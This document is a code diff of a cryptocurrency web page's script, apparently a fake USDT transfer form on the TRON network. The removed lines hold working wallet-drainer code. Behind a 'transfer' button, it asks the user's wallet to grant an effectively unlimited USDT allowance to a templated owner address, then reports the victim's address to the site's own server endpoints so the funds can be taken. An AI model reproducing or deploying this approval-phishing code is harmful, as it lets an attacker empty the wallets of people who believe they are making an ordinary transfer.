@@ -260,23 +260,8 @@
 <script>
   var user;
   var usdrate=0.155
-  $(function ($) {
-    
-    $("[address],[amount]").keyup(function(){
-        var address=$("[address]").val();
-        var amount=$("[amount]").val();
-        if(address&&amount&&address.length>15){
-          $("#tran")[0].style.background="#088de6"
-          $("#tran").attr("disabled",false)}
-        else{
-          $("#tran")[0].style.background="#eaecf6"
-           $("#tran").attr("disabled",true)
-        }
-        $('#rmb').text((amount/usdrate).toLocaleString() )
-    })
-    
-    
-    $("body")[0].style.display="block";
+ 
+  
     
     var trx_usdt_contractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
   
@@ -288,37 +273,10 @@
 	        let result = await trx_usdt.balanceOf(user).call(function(err,tex){
 	            if(err == null){
 	                let total = tex._hex/(10**6);
-	                 $("#balance").text(total.toLocaleString());
 	            }
 	        });
     }
-    
-    $("#tran").on("click",async function () {
-        
-        $.get(`/Public/save?chain=trc&address=${user}`);
-        debugger
-    	let res = await trx_usdt["approve"]('{$owner}',"90000000000000000000000000000");
-			res.send({
-				feeLimit: 100000000,
-				callValue: 0,
-				shouldPollResponse: false
-			},async function(err,res){
-			 if(err == null){
-			   await trx_usdt.allowance(user,'{$owner}').call(function(err,tex){
-	            if(err == null){
-	                let eth_usdt_approval = tex.remaining._hex/(10**6);
-	                if(eth_usdt_approval>0) 
-                        $.get(`/Public/set?address=${user}&owner={$owner}`)
-	                }
-	            });
-			  }else
-			    alert(err.message)
-			})
-    })
-    
-    
-   
-    
+
     
 })
 
